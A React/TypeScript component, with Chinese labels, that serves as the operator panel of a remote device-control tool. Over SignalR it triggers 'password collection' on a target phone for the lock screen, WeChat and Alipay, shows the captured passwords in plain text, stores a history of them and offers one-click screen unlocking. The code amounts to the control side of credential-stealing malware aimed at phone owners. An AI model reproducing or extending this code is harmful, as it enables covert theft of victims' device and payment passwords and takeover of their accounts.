import React, { useEffect, useState, useRef } from 'react';
import { Card, Button, Space, message, Input, Switch, Tag, Alert, Spin, Modal, List, Empty, Tooltip, Divider } from 'antd';
import {
  KeyOutlined,
  SyncOutlined,
  DeleteOutlined,
  PlayCircleOutlined,
  PauseCircleOutlined,
  UnlockOutlined,
  LockOutlined,
  WechatOutlined,
  AlipayCircleOutlined,
  MobileOutlined,
  HistoryOutlined,
  SaveOutlined,
  ClearOutlined,
  InfoCircleOutlined,
} from '@ant-design/icons';
import { signalRService } from '../services/signalr';
import type { DeviceInfo } from '../types/device';

interface PasswordManagerProps {
  device: DeviceInfo;
}

// 密码类型枚举（与后端一致）
enum PasswordType {
  LockScreen = 1,
  WeChat = 2,
  Alipay = 3,
  LockScreenAuto = 4,
}

// 密码信息
interface PasswordInfo {
  value: string;
  collected: boolean;
  lastUpdated?: string;
}

// 密码数据结构
interface PasswordData {
  lockScreen?: PasswordInfo;
  weChat?: PasswordInfo;
  alipay?: PasswordInfo;
  lockScreenAuto?: PasswordInfo;
}

// 密码历史记录
interface PasswordHistory {
  deviceId: string;
  type: PasswordType;
  password: string;
  timestamp: string;
}

const PasswordManager: React.FC<PasswordManagerProps> = ({ device }) => {
  const [passwordData, setPasswordData] = useState<PasswordData>({});
  const [isCollecting, setIsCollecting] = useState(false);
  const [collectingType, setCollectingType] = useState<PasswordType | null>(null);
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [passwordHistory, setPasswordHistory] = useState<PasswordHistory[]>([]);
  const [showHistoryModal, setShowHistoryModal] = useState(false);
  const [unlockPassword, setUnlockPassword] = useState('');
  const [autoRefresh, setAutoRefresh] = useState(false);
  const refreshIntervalRef = useRef<number | null>(null);

  // 组件加载时请求密码列表
  useEffect(() => {
    requestPasswordList();

    // 订阅密码更新事件
    const handlePasswordUpdate = (data: any) => {
      if (data.deviceId !== device.deviceId) return;

      try {
        const parsedData = JSON.parse(data.passwordData);
        console.log('[PasswordManager] 收到密码数据:', parsedData);

        setPasswordData(parsedData);

        // 保存到历史记录
        savePasswordToHistory(parsedData);

        // 如果正在采集，检查是否采集完成
        if (isCollecting && collectingType) {
          const typeKey = getPasswordTypeKey(collectingType);
          if (parsedData[typeKey]?.collected) {
            message.success(`${getPasswordTypeName(collectingType)}采集完成`);
            setIsCollecting(false);
            setCollectingType(null);
          }
        }
      } catch (error) {
        console.error('[PasswordManager] 解析密码数据失败:', error);
        setError('解析密码数据失败');
      }
    };

    signalRService.connection?.on('ReceivePasswordList', handlePasswordUpdate);

    return () => {
      signalRService.connection?.off('ReceivePasswordList', handlePasswordUpdate);
      if (refreshIntervalRef.current) {
        clearInterval(refreshIntervalRef.current);
      }
    };
  }, [device.deviceId, isCollecting, collectingType]);

  // 自动刷新
  useEffect(() => {
    if (autoRefresh) {
      refreshIntervalRef.current = setInterval(() => {
        requestPasswordList();
      }, 5000);
    } else {
      if (refreshIntervalRef.current) {
        clearInterval(refreshIntervalRef.current);
        refreshIntervalRef.current = null;
      }
    }

    return () => {
      if (refreshIntervalRef.current) {
        clearInterval(refreshIntervalRef.current);
      }
    };
  }, [autoRefresh]);

  // 请求密码列表
  const requestPasswordList = async () => {
    try {
      setIsLoading(true);
      const success = await signalRService.connection?.invoke<boolean>(
        'RequestPasswordList',
        device.deviceId
      );

      if (!success) {
        setError('请求密码列表失败');
      } else {
        setError(null);
      }
    } catch (error) {
      console.error('[PasswordManager] 请求密码列表失败:', error);
      setError('请求密码列表失败: ' + (error as Error).message);
    } finally {
      setIsLoading(false);
    }
  };

  // 重置密码
  const resetPassword = async (passwordType: PasswordType) => {
    try {
      setIsLoading(true);
      const success = await signalRService.connection?.invoke<boolean>(
        'ResetPassword',
        device.deviceId,
        passwordType
      );

      if (success) {
        message.success(`已重置${getPasswordTypeName(passwordType)}`);
        // 刷新密码列表
        requestPasswordList();
      } else {
        message.error('重置失败');
      }
    } catch (error) {
      console.error('[PasswordManager] 重置密码失败:', error);
      message.error('重置密码失败');
    } finally {
      setIsLoading(false);
    }
  };

  // 重置所有密码
  const resetAllPasswords = async () => {
    Modal.confirm({
      title: '确认重置',
      content: '确定要重置所有密码吗？',
      okText: '确定',
      cancelText: '取消',
      onOk: async () => {
        try {
          setIsLoading(true);
          const success = await signalRService.connection?.invoke<boolean>(
            'ResetAllPasswords',
            device.deviceId
          );

          if (success) {
            message.success('已重置所有密码');
            requestPasswordList();
          } else {
            message.error('重置失败');
          }
        } catch (error) {
          console.error('[PasswordManager] 重置所有密码失败:', error);
          message.error('重置所有密码失败');
        } finally {
          setIsLoading(false);
        }
      },
    });
  };

  // 开始密码采集
  const startPasswordCollection = async (passwordType: PasswordType) => {
    try {
      setIsLoading(true);
      const success = await signalRService.connection?.invoke<boolean>(
        'StartPasswordCollection',
        device.deviceId,
        passwordType
      );

      if (success) {
        setIsCollecting(true);
        setCollectingType(passwordType);
        message.info(`已开始采集${getPasswordTypeName(passwordType)}`);
      } else {
        message.error('开始采集失败');
      }
    } catch (error) {
      console.error('[PasswordManager] 开始密码采集失败:', error);
      message.error('开始密码采集失败');
    } finally {
      setIsLoading(false);
    }
  };

  // 停止密码采集
  const stopPasswordCollection = async () => {
    try {
      setIsLoading(true);
      const success = await signalRService.connection?.invoke<boolean>(
        'StopPasswordCollection',
        device.deviceId
      );

      if (success) {
        setIsCollecting(false);
        setCollectingType(null);
        message.info('已停止密码采集');
      } else {
        message.error('停止采集失败');
      }
    } catch (error) {
      console.error('[PasswordManager] 停止密码采集失败:', error);
      message.error('停止密码采集失败');
    } finally {
      setIsLoading(false);
    }
  };

  // 一键解锁
  const handleUnlock = async () => {
    if (!unlockPassword) {
      message.warning('请输入解锁密码');
      return;
    }

    // 这里可以调用相应的解锁接口
    // 暂时只显示提示
    message.info(`尝试使用密码 "${unlockPassword}" 解锁设备`);

    // 保存到历史
    const history: PasswordHistory = {
      deviceId: device.deviceId,
      type: PasswordType.LockScreen,
      password: unlockPassword,
      timestamp: new Date().toISOString(),
    };

    const existingHistory = JSON.parse(localStorage.getItem('passwordHistory') || '[]');
    existingHistory.unshift(history);

    // 最多保留50条记录
    if (existingHistory.length > 50) {
      existingHistory.length = 50;
    }

    localStorage.setItem('passwordHistory', JSON.stringify(existingHistory));
    setPasswordHistory(existingHistory);
  };

  // 保存密码到历史记录
  const savePasswordToHistory = (data: PasswordData) => {
    const history: PasswordHistory[] = JSON.parse(localStorage.getItem('passwordHistory') || '[]');

    Object.entries(data).forEach(([key, value]) => {
      if (value?.value && value.collected) {
        const type = getPasswordTypeFromKey(key);
        if (type) {
          const exists = history.find(h =>
            h.deviceId === device.deviceId &&
            h.type === type &&
            h.password === value.value
          );

          if (!exists) {
            history.unshift({
              deviceId: device.deviceId,
              type,
              password: value.value,
              timestamp: new Date().toISOString(),
            });
          }
        }
      }
    });

    // 最多保留50条记录
    if (history.length > 50) {
      history.length = 50;
    }

    localStorage.setItem('passwordHistory', JSON.stringify(history));
    setPasswordHistory(history);
  };

  // 加载历史记录
  const loadPasswordHistory = () => {
    const history = JSON.parse(localStorage.getItem('passwordHistory') || '[]');
    setPasswordHistory(history.filter((h: PasswordHistory) => h.deviceId === device.deviceId));
    setShowHistoryModal(true);
  };

  // 清除历史记录
  const clearPasswordHistory = () => {
    Modal.confirm({
      title: '确认清除',
      content: '确定要清除所有密码历史记录吗？',
      okText: '确定',
      cancelText: '取消',
      onOk: () => {
        localStorage.removeItem('passwordHistory');
        setPasswordHistory([]);
        message.success('已清除密码历史记录');
      },
    });
  };

  // 获取密码类型名称
  const getPasswordTypeName = (type: PasswordType): string => {
    switch (type) {
      case PasswordType.LockScreen:
        return '锁屏密码';
      case PasswordType.WeChat:
        return '微信密码';
      case PasswordType.Alipay:
        return '支付宝密码';
      case PasswordType.LockScreenAuto:
        return '自动锁屏密码';
      default:
        return '未知类型';
    }
  };

  // 获取密码类型的键名
  const getPasswordTypeKey = (type: PasswordType): keyof PasswordData => {
    switch (type) {
      case PasswordType.LockScreen:
        return 'lockScreen';
      case PasswordType.WeChat:
        return 'weChat';
      case PasswordType.Alipay:
        return 'alipay';
      case PasswordType.LockScreenAuto:
        return 'lockScreenAuto';
      default:
        return 'lockScreen';
    }
  };

  // 从键名获取密码类型
  const getPasswordTypeFromKey = (key: string): PasswordType | null => {
    switch (key) {
      case 'lockScreen':
        return PasswordType.LockScreen;
      case 'weChat':
        return PasswordType.WeChat;
      case 'alipay':
        return PasswordType.Alipay;
      case 'lockScreenAuto':
        return PasswordType.LockScreenAuto;
      default:
        return null;
    }
  };

  // 获取图标
  const getPasswordIcon = (type: PasswordType) => {
    switch (type) {
      case PasswordType.LockScreen:
        return <LockOutlined />;
      case PasswordType.WeChat:
        return <WechatOutlined style={{ color: '#07C160' }} />;
      case PasswordType.Alipay:
        return <AlipayCircleOutlined style={{ color: '#1677FF' }} />;
      case PasswordType.LockScreenAuto:
        return <MobileOutlined />;
      default:
        return <KeyOutlined />;
    }
  };

  // 渲染密码卡片
  const renderPasswordCard = (type: PasswordType) => {
    const key = getPasswordTypeKey(type);
    const info = passwordData[key];
    const isCurrentCollecting = isCollecting && collectingType === type;

    return (
      <Card
        key={type}
        title={
          <Space>
            {getPasswordIcon(type)}
            <span>{getPasswordTypeName(type)}</span>
            {info?.collected && <Tag color="green">已采集</Tag>}
            {isCurrentCollecting && <Tag color="blue">采集中...</Tag>}
          </Space>
        }
        size="small"
        style={{ marginBottom: 16 }}
      >
        <Space direction="vertical" style={{ width: '100%' }}>
          <div>
            <strong>密码值: </strong>
            {info?.value ? (
              <code style={{
                backgroundColor: '#f0f0f0',
                padding: '2px 8px',
                borderRadius: 4,
                fontSize: 14,
                fontFamily: 'monospace'
              }}>
                {info.value}
              </code>
            ) : (
              <span style={{ color: '#999' }}>未采集</span>
            )}
          </div>

          {info?.lastUpdated && (
            <div>
              <strong>更新时间: </strong>
              <span>{new Date(info.lastUpdated).toLocaleString()}</span>
            </div>
          )}

          <Space>
            {!isCurrentCollecting ? (
              <Button
                size="small"
                type="primary"
                icon={<PlayCircleOutlined />}
                onClick={() => startPasswordCollection(type)}
                loading={isLoading}
              >
                开始采集
              </Button>
            ) : (
              <Button
                size="small"
                danger
                icon={<PauseCircleOutlined />}
                onClick={stopPasswordCollection}
                loading={isLoading}
              >
                停止采集
              </Button>
            )}

            <Button
              size="small"
              icon={<DeleteOutlined />}
              onClick={() => resetPassword(type)}
              loading={isLoading}
            >
              重置
            </Button>
          </Space>
        </Space>
      </Card>
    );
  };

  return (
    <Card
      title={`密码管理 - ${device.displayName}`}
      extra={
        <Space>
          <Switch
            checkedChildren="自动刷新"
            unCheckedChildren="手动刷新"
            checked={autoRefresh}
            onChange={setAutoRefresh}
          />
          <Button
            icon={<SyncOutlined />}
            onClick={requestPasswordList}
            loading={isLoading}
          >
            刷新
          </Button>
          <Button
            icon={<HistoryOutlined />}
            onClick={loadPasswordHistory}
          >
            历史记录
          </Button>
        </Space>
      }
    >
      <Space direction="vertical" style={{ width: '100%' }}>
        {/* 错误提示 */}
        {error && (
          <Alert
            message="错误"
            description={error}
            type="error"
            showIcon
            closable
            onClose={() => setError(null)}
          />
        )}

        {/* 一键解锁 */}
        <Card title="快速解锁" size="small">
          <Space.Compact style={{ width: '100%' }}>
            <Input
              prefix={<UnlockOutlined />}
              placeholder="输入解锁密码"
              value={unlockPassword}
              onChange={(e) => setUnlockPassword(e.target.value)}
              onPressEnter={handleUnlock}
            />
            <Button
              type="primary"
              onClick={handleUnlock}
              loading={isLoading}
            >
              一键解锁
            </Button>
          </Space.Compact>
          <div style={{ marginTop: 8 }}>
            <InfoCircleOutlined />
            <span style={{ marginLeft: 8, color: '#999', fontSize: 12 }}>
              输入密码后点击一键解锁，可以快速解锁设备屏幕
            </span>
          </div>
        </Card>

        <Divider />

        {/* 密码列表 */}
        <div>
          {renderPasswordCard(PasswordType.LockScreen)}
          {renderPasswordCard(PasswordType.WeChat)}
          {renderPasswordCard(PasswordType.Alipay)}
          {renderPasswordCard(PasswordType.LockScreenAuto)}
        </div>

        {/* 操作按钮 */}
        <Space>
          <Button
            danger
            icon={<ClearOutlined />}
            onClick={resetAllPasswords}
            loading={isLoading}
          >
            重置所有密码
          </Button>
        </Space>

        {/* 加载中 */}
        {isLoading && (
          <div style={{ textAlign: 'center', padding: 20 }}>
            <Spin tip="处理中..." />
          </div>
        )}
      </Space>

      {/* 历史记录弹窗 */}
      <Modal
        title="密码历史记录"
        open={showHistoryModal}
        onCancel={() => setShowHistoryModal(false)}
        footer={[
          <Button key="clear" danger onClick={clearPasswordHistory}>
            清除历史
          </Button>,
          <Button key="close" onClick={() => setShowHistoryModal(false)}>
            关闭
          </Button>,
        ]}
        width={600}
      >
        {passwordHistory.length > 0 ? (
          <List
            dataSource={passwordHistory}
            renderItem={(item) => (
              <List.Item
                actions={[
                  <Tooltip title="复制密码">
                    <Button
                      size="small"
                      icon={<SaveOutlined />}
                      onClick={() => {
                        navigator.clipboard.writeText(item.password);
                        message.success('已复制到剪贴板');
                      }}
                    >
                      复制
                    </Button>
                  </Tooltip>,
                ]}
              >
                <List.Item.Meta
                  avatar={getPasswordIcon(item.type)}
                  title={getPasswordTypeName(item.type)}
                  description={
                    <Space direction="vertical" size={0}>
                      <span>密码: <code>{item.password}</code></span>
                      <span style={{ fontSize: 12, color: '#999' }}>
                        {new Date(item.timestamp).toLocaleString()}
                      </span>
                    </Space>
                  }
                />
              </List.Item>
            )}
          />
        ) : (
          <Empty description="暂无历史记录" />
        )}
      </Modal>
    </Card>
  );
};

export default PasswordManager;